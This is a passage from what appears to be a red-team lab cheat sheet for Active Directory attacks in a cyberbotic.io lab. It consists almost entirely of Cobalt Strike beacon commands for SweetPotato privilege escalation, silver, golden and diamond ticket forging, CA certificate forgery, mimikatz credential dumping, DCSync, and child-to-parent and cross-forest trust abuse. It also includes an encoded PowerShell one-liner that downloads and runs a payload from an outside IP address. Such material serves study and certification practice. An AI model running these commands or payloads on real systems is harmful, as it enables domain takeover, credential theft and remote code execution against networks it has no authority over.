</code></pre></div></li><li><p>MSSQL Server - Privilege Escalation</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># MSSQL Server : Privilege Escalation - Service Account (SeImpersonate) to System </span>
  
<span style=color:#75715e># The built-in service account that runs the MSSQL DB Service has the SeImpersonate Privilege by Default. This privilege can potentially be exploited to gain local admin access (System) using the SweetPotato exploit.</span>
<span style=color:#75715e># After getting beacon to any initial or linked SQL Server , We can Priv Esc to  that server.</span>
  
<span style=color:#75715e># 1. Use seatbelt utility to identify the privilege tokens available</span>
beacon&gt; getuid
beacon&gt; shell whoami /priv
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
  
<span style=color:#75715e># 2. If seimpersonate privilege is found, we can use it to impersonate system account.</span>
beacon&gt; execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
beacon&gt; shell whoami /priv
  
<span style=color:#75715e># 3. Use sweet potato exploit to get system shell</span>
<span style=color:#75715e># Encoded Powershell payload</span>
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==
<span style=color:#75715e># execute sweet potato to get reverse shell/beacon as system user</span>
beacon&gt; execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAzADkAOgA4ADAALwBhACcAKQApAA==</span><span style=color:#e6db74>&#34;</span>
beacon&gt; connect localhost 4444
</code></pre></div></li></ul><h3 id=domain-dominance>Domain Dominance</h3><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>### Silver Ticket (offline)</span>

<span style=color:#75715e># 1. Dump the machine hash using mimikatz (Service from 0 - hash)</span>
beacon&gt; mimikatz !sekurlsa::ekeys
beacon&gt; mimikatz !sekurlsa::logonpasswords

<span style=color:#75715e># 2. Generate the silver Ticket TGS offline using Rubeus (use /rc4 flag for NTLM hash)</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainSID -Domain dev.cyberbotic.io

PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service<span style=color:#960050;background-color:#1e0010>:</span>cifs/wkstn-1.dev.cyberbotic.io /aes256<span style=color:#960050;background-color:#1e0010>:</span>c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user<span style=color:#960050;background-color:#1e0010>:</span>nlamb /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /sid<span style=color:#960050;background-color:#1e0010>:</span>S-1-5-21-569305411-121244042-2357301523 /nowrap

<span style=color:#75715e># 3. Inject the ticket and Verify the access </span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFXD[...]MuaW8=
beacon&gt; steal_token 5668
beacon&gt; ls \\wkstn-1.dev.cyberbotic.io\c$
beacon&gt; jump psexec64 wkstn-1.dev.cyberbotic.io smb

<span style=color:#75715e># 4. Obtain more Service Tickets and inject (/ptt) into the sacrificial process</span>
PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service<span style=color:#960050;background-color:#1e0010>:</span>HOST/wkstn-1.dev.cyberbotic.io /aes256<span style=color:#960050;background-color:#1e0010>:</span>c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user<span style=color:#960050;background-color:#1e0010>:</span>nlamb /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /sid<span style=color:#960050;background-color:#1e0010>:</span>S-1-5-21-569305411-121244042-2357301523 /nowrap

beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket<span style=color:#960050;background-color:#1e0010>:</span>&lt;TGS-TICKET&gt;

beacon&gt; run klist
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$

<span style=color:#75715e># 5. Different Services required for different uses. (For more - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#silver-ticket)</span>

<span style=color:#75715e># psexec |  CIFS </span>
<span style=color:#75715e># winrm  |  HOST &amp; HTTP</span>
<span style=color:#75715e># wmi    | HOST &amp; RPCSS</span>
<span style=color:#75715e># dcsync (DCs only) | LDAP</span>

<span style=color:#75715e>#-------------------------------------------------------------------------------------</span>

<span style=color:#75715e>### Golden Ticket (offline)</span>

<span style=color:#75715e># 1. Fetch the NTLM/AES hash of krbtgt account</span>
beacon&gt; dcsync dev.cyberbotic.io DEV\krbtgt

<span style=color:#75715e># 2. Generate Golden ticket offline using Rubeus</span>
<span style=color:#75715e># Find the domain SID</span>
beacon&gt; powerpick Get-DomainSid -Domain dev.cyberbotic.io
<span style=color:#75715e># Create Golden Ticket</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainSID -Domain dev.cyberbotic.io

beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256<span style=color:#960050;background-color:#1e0010>:</span>51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user<span style=color:#960050;background-color:#1e0010>:</span>nlamb /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /sid<span style=color:#960050;background-color:#1e0010>:</span>S-1-5-21-569305411-121244042-2357301523 /nowrap

<span style=color:#75715e># 3. Inject golden ticket and gain access</span>
<span style=color:#75715e># 3-a. For MACHINE TGT : Use Machine TGT fetched to gain RCE on itself using S4U abuse (/self flag)</span>
<span style=color:#75715e># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span>
<span style=color:#75715e># Verify this by injecting the TGT insto a sacrificial process and try to access the files. Check S4U2Self Notes below.</span>
<span style=color:#75715e># Generate TGS from TGT</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /self /altservice<span style=color:#960050;background-color:#1e0010>:</span>cifs/dc-2.dev.cyberbotic.io /user<span style=color:#960050;background-color:#1e0010>:</span>dc-2$ /nowrap /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...]lDLklP
<span style=color:#75715e># Inject TGS in a sacrificial process</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
<span style=color:#75715e># 3-b. For DOMAIN USER TGT : Inject the ticket and access the service.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$

<span style=color:#75715e># --------------------------------------------------------------------------------------</span>
<span style=color:#75715e>### Diamond Ticket (online)</span>

<span style=color:#75715e># 1. Fetch the SID of User/Machine for which we </span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick ConvertTo-SID dev/nlamb

beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick get-domaincomputer -identity dc-2 | select samaccountname,primarygroupid,objectsid

<span style=color:#75715e># 2. Create Diamond ticket (512 - Enterprise Group ID, krbkey - Hash of KRBRGT account)</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /ticketuserid<span style=color:#960050;background-color:#1e0010>:</span>1106 /groups<span style=color:#960050;background-color:#1e0010>:</span>512 /krbkey<span style=color:#960050;background-color:#1e0010>:</span>51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
<span style=color:#75715e># /tgtdeleg : uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.</span>
<span style=color:#75715e># /ticketuser : is the username of the user to impersonate.</span>
<span style=color:#75715e># /ticketuserid : is the domain RID of that user.</span>
<span style=color:#75715e># /groups : are the desired group RIDs (512 being Domain Admins).</span>
<span style=color:#75715e># /krbkey : is the krbtgt AES256 hash.</span>

<span style=color:#75715e># 3. Rubeus describe will now show that this is a TGT for the target user.</span>
PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFYj[...snip...]MuSU8=

<span style=color:#75715e># 4. Inject Diamond ticket (TGT) and gain acess</span>
<span style=color:#75715e># 3-a. For MACHINE TGT : Use Machine TGT fetched to gain RCE on itself using S4U abuse (/self flag)</span>
<span style=color:#75715e># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span>
<span style=color:#75715e># Verify this by injecting the TGT insto a sacrificial process and try to access the files. Check S4U2Self Notes below.</span>
<span style=color:#75715e># Generate TGS from TGT</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /self /altservice<span style=color:#960050;background-color:#1e0010>:</span>cifs/dc-2.dev.cyberbotic.io /user<span style=color:#960050;background-color:#1e0010>:</span>dc-2$ /nowrap /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...]lDLklP
<span style=color:#75715e># Inject TGS in a sacrificial process</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
<span style=color:#75715e># 3-b. For DOMAIN USER TGT : Inject the ticket and access the service.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$

<span style=color:#75715e># ----------------------------------------------------------------------------------</span>
<span style=color:#75715e>### DPERSIST-1 : Forged certificates (DC or CA Server)</span>

<span style=color:#75715e># 0. Finding Certificate Authorities</span>
beacon&gt; execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

<span style=color:#75715e># 1. Dump the Private Key and Certificate of CA (run command in DC/CA)</span>
beacon&gt; execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

<span style=color:#75715e># 2. Save the certificate in .pem file and convert into pfx format using openssl</span>
ubuntu@DESKTOP-3BSK7NO ~&gt; openssl pkcs12 -in cert.pem -keyex -CSP <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Microsoft Enhanced Cryptographic Provider v1.0</span><span style=color:#e6db74>&#34;</span> -export -out cert.pfx

<span style=color:#75715e># 3. Next, use the stolen CA cert to generate fake cert for Domain user/Machine</span>
PS C:\Users\Attacker&gt; C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>CN=User</span><span style=color:#e6db74>&#34;</span> --SubjectAltName <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>nlamb@cyberbotic.io</span><span style=color:#e6db74>&#34;</span> --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass1231

<span style=color:#75715e># 4. Encode the certificate</span>
ubuntu@DESKTOP-3BSK7NO ~&gt; cat cert.pfx | base64 -w 0

<span style=color:#75715e># 5. Use the certificate to get TGT for Domain User/Machine or Domain Admin</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>nlamb /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /enctype<span style=color:#960050;background-color:#1e0010>:</span>aes256 /password<span style=color:#960050;background-color:#1e0010>:</span>pass123 /nowrap /certificate<span style=color:#960050;background-color:#1e0010>:</span>MIACAQ[...snip...]IEAAAA

<span style=color:#75715e># 6. Inject the ticket (TGT) and access the service</span>
<span style=color:#75715e># 6-A. For MACHINE TGT : Use Machine TGT fetched to gain RCE on itself using S4U abuse (/self flag)</span>
<span style=color:#75715e># NOTE: A machine account TGT ticket if injected will not work probably, So we have to  abuse S4U2SELF to obtain TGS and get access as Local Admin to that machine.</span>
<span style=color:#75715e># Verify this by injecting the TGT insto a sacrificial process and try to access the files. Check S4U2Self Notes below.</span>
<span style=color:#75715e># Generate TGS from TGT</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser<span style=color:#960050;background-color:#1e0010>:</span>nlamb /self /altservice<span style=color:#960050;background-color:#1e0010>:</span>cifs/dc-2.dev.cyberbotic.io /user<span style=color:#960050;background-color:#1e0010>:</span>dc-2$ /nowrap /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFuj[...]lDLklP
<span style=color:#75715e># Inject TGS in a sacrificial process</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
<span style=color:#75715e># 6-B. For DOMAIN USER TGT : Inject the ticket and access the service.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFyD[...]MuaW8=
beacon&gt; steal_token 2664
beacon&gt; ls \\dc-2.dev.cyberbotic.io\c$
</code></pre></div><h3 id=forest--domain-trusts>Forest & Domain Trusts</h3><ul><li><p>Cross Domain Attacks</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## PrivEsc : Child (DEV.CYBERBOTIC.IO) to Parent (CYBERBOTIC.IO) within Same Domain via SID History using KrbTGT Hash of Child Domain. (Also possible using Trust Tickets)</span>
  
<span style=color:#75715e># 1. Get the KrbTGT hash, From DC by running Mimikatz or using DCSync Attack.</span>
beacon&gt; mimikatz !lsadump::dcsync /user<span style=color:#960050;background-color:#1e0010>:</span>dev\krbtgt
beacon&gt; dcsync dev.cyberbotic.io dev\krbtgt
  
<span style=color:#75715e># 2. Enumerate the Domain Trusts (Use -Domain attribute to enumerate other domains)</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainTrust
  
<span style=color:#75715e># 3. Enumerate basic info required for creating forged ticket</span>
<span style=color:#75715e># Find the SID of Domain Admin / Enterprise Admin group of parent domain</span>
beacon&gt; powerpick Get-DomainGroup -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Domain Admins</span><span style=color:#e6db74>&#34;</span> -Domain cyberbotic.io -Properties ObjectSid
beacon&gt; powerpick Get-DomainSID -Domain <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>dev.cyberbotic.io</span><span style=color:#e6db74>&#34;</span>
<span style=color:#75715e># Domain controller of parent domain</span>
beacon&gt; powerpick Get-DomainController -Domain cyberbotic.io | select Name
<span style=color:#75715e># Domain Admin of parent domain</span>
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Domain Admins</span><span style=color:#e6db74>&#34;</span> -Domain cyberbotic.io | select MemberName
  
<span style=color:#75715e># 4-a. Use Golden Ticket technique (/sid - SID of the current domain &amp; /sids - SID of Enterprise Admins or Parent Domain Admins &amp; /aes256 - Krbtgt Hash)</span>
PS C:\Users\Attacker&gt; C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256<span style=color:#960050;background-color:#1e0010>:</span>51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user<span style=color:#960050;background-color:#1e0010>:</span>Administrator /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /sid<span style=color:#960050;background-color:#1e0010>:</span>S-1-5-21-569305411-121244042-2357301523 /sids<span style=color:#960050;background-color:#1e0010>:</span>S-1-5-21-2594061375-675613155-814674916-512 /nowrap
  
<span style=color:#75715e># 4-b. Or, Use Diamond Ticket technique</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser<span style=color:#960050;background-color:#1e0010>:</span>Administrator /ticketuserid<span style=color:#960050;background-color:#1e0010>:</span>500 /groups<span style=color:#960050;background-color:#1e0010>:</span>519 /sids<span style=color:#960050;background-color:#1e0010>:</span>S-1-5-21-2594061375-675613155-814674916-519 /krbkey<span style=color:#960050;background-color:#1e0010>:</span>51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap
  
<span style=color:#75715e># 5. Inject the ticket</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>DEV /username<span style=color:#960050;background-color:#1e0010>:</span>nlamb /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFLz[...snip...]MuaW8=
  
beacon&gt; steal_token 5060
beacon&gt; run klist
beacon&gt; ls \\dc-1.cyberbotic.io\c$
beacon&gt; jump psexec64 dc-1.cyberbotic.io smb
beacon&gt; dcsync cyberbotic.io cyber\krbtgt
beacon&gt; mimikatz !lsadump::dcsync /all /domain<span style=color:#960050;background-color:#1e0010>:</span>cyberbotic.io
</code></pre></div></li><li><p>Cross Forest Attacks (Inbound / Outbound)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e>## Exploiting Inbound Trusts (Users in our domain can access resources in foreign domain) </span>
<span style=color:#75715e># 1. We can enumerate the foreign domain with inbound trust</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainTrust
beacon&gt; powerpick Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName
  
<span style=color:#75715e># 2. Check if members in current domain are part of any group in foreign domain</span>
<span style=color:#75715e># Enumerate any groups that contain users outside of its domain</span>
beacon&gt; powerpick Get-DomainForeignGroupMember -Domain dev-studio.com
beacon&gt; powerpick Find-ForeignGroup -Domain dev-studio.com
beacon&gt; powerpick Find-ForeignUser -Domain dev-studio.com
  
<span style=color:#75715e># Verify the username from SID returned in previous step</span>
beacon&gt; powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
  
beacon&gt; powerpick Get-DomainGroupMember -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>Studio Admins</span><span style=color:#e6db74>&#34;</span> | select MemberName
beacon&gt; powerpick Get-DomainController -Domain dev-studio.com | select Name
  
<span style=color:#75715e># 3. Fetch the AES256 hash of Domain user , who have the access or part of the group in foreign domain.</span>
beacon&gt; dcsync dev.cyberbotic.io dev\nlamb
beacon&gt; mimikatz !lsadump::dcsync dev\nlamb /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io
<span style=color:#75715e># 4. We can create Inter-Realm TGT for user identified in above steps (/aes256 has users hash)</span>
<span style=color:#75715e># Getting TGT using hash</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>nlamb /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /aes256<span style=color:#960050;background-color:#1e0010>:</span>a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap
<span style=color:#75715e># Getting Inter-Realm TGT for target domain from current domain TGT.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service<span style=color:#960050;background-color:#1e0010>:</span>krbtgt/dev-studio.com /domain<span style=color:#960050;background-color:#1e0010>:</span>dev.cyberbotic.io /dc<span style=color:#960050;background-color:#1e0010>:</span>dc-2.dev.cyberbotic.io /nowrap /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFwj[...]MuaW8=
<span style=color:#75715e># Getting TGS from inter-realm TGT for Target Domain</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service<span style=color:#960050;background-color:#1e0010>:</span>cifs/dc.dev-studio.com /domain<span style=color:#960050;background-color:#1e0010>:</span>dev-studio.com /dc<span style=color:#960050;background-color:#1e0010>:</span>dc.dev-studio.com /nowrap /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFoz[...]NPTQ==
  
<span style=color:#75715e># 4. Inject the ticket</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>dc-studio.com /username<span style=color:#960050;background-color:#1e0010>:</span>Administrator /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFLz[...snip...]MuaW8=
  
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFLz[...snip...]MuaW8=
  
beacon&gt; steal_token 5060
beacon&gt; run klist
beacon&gt; ls \\dc.dev-studio.com\c$
  
<span style=color:#75715e># ---------------------------------------------------------------------------------</span>
<span style=color:#75715e>## Exploiting Outbound Trusts (Users in other domain can access resources in our domain)</span>
  
<span style=color:#75715e># 1. Enumerate the outbound trust (msp.com) in parent domain (cyberbotic.io)</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainTrust -Domain cyberbotic.io
  
<span style=color:#75715e># 2. Enumerate the TDO to fetch the shared trust key </span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(objectCategory=trustedDomain)</span><span style=color:#e6db74>&#34;</span> --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection
  
<span style=color:#75715e># 3-a. # Dump the TDO Object from DC (parent) directly - (Not OPSEC Safe)</span>
beacon&gt; run hostname
beacon&gt; mimikatz lsadump::trust /patch
  
<span style=color:#75715e># 3-b. OR, Use DCSync to get the ntlm hash of TDO object remotely</span>
beacon&gt; powerpick Get-DomainObject -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>CN=msp.org,CN=System,DC=cyberbotic,DC=io</span><span style=color:#e6db74>&#34;</span> | select objectGuid
beacon&gt; mimikatz @lsadump::dcsync /domain<span style=color:#960050;background-color:#1e0010>:</span>cyberbotic.io /guid<span style=color:#960050;background-color:#1e0010>:</span>{b93d2e36-48df-46bf-89d5-2fc22c139b43}
  
<span style=color:#75715e># 4. There is a &#34;trust account&#34; which gets created in trusted domain (msp.com) by the name of trusting domain (CYBER$), it can be impersonated to gain normal user access (/rc4 is the NTLM hash of TDO Object)</span>
<span style=color:#75715e># Get all the user accounts in the DEV domain, we&#39;ll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts.</span>
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(objectCategory=user)</span><span style=color:#e6db74>&#34;</span>
  
<span style=color:#75715e># 5. Outbound Domain (MSP domain) will have a trust account (CYBER$), even though we can&#39;t enumerate across the trust to confirm it.  This is the account we must impersonate to request Kerberos tickets across the trust.</span>
<span style=color:#75715e># A user can create Multiple computer objects and later can Abuse them, We have user access in this case, So find some way to abuse it.</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user<span style=color:#960050;background-color:#1e0010>:</span>CYBER$ /domain<span style=color:#960050;background-color:#1e0010>:</span>msp.org /rc4<span style=color:#960050;background-color:#1e0010>:</span>8c0124e706679550bf14182477f7a8dc /nowrap
  
<span style=color:#75715e># 6. Inject the ticket</span>
beacon&gt; execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program<span style=color:#960050;background-color:#1e0010>:</span>C:\Windows\System32\cmd.exe /domain<span style=color:#960050;background-color:#1e0010>:</span>MSP /username<span style=color:#960050;background-color:#1e0010>:</span>CYBER$ /password<span style=color:#960050;background-color:#1e0010>:</span>FakePass /ticket<span style=color:#960050;background-color:#1e0010>:</span>doIFLz[...snip...]MuaW8=
  
beacon&gt; steal_token 5060
beacon&gt; run klist
  
<span style=color:#75715e># 7. We can now use the normal user session, to enumerate the domain. OR We can create Multiple computer objects and later can Abuse them, We have user access in this case, So find some way to abuse it.</span>
beacon&gt; powerpick Get-Domain -Domain msp.org
beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>(objectCategory=user)</span><span style=color:#e6db74>&#34;</span> --domain msp.org
  
<span style=color:#75715e># Create a Computer Object to abuse it</span>
beacon&gt; powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1
beacon&gt; powerpick Get-DomainObject -Identity <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>DC=dev,DC=cyberbotic,DC=io</span><span style=color:#e6db74>&#34;</span> -Properties ms-DS-MachineAccountQuota
<span style=color:#75715e># If You wants to create a new computer object for a different Forest using StandIn Tool, Then Read this blog by Rasta - https://rastamouse.me/getdomain-vs-getcomputerdomain-vs-getcurrentdomain/</span>
<span style=color:#75715e># Note: StandIn code needs to be modified if you wants to create a Computer in another Domain using --Domain parameter. (https://github.com/FuzzySecurity/StandIn/pull/17)</span>
beacon&gt; execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make --Domain dev.cyberbotic.io 
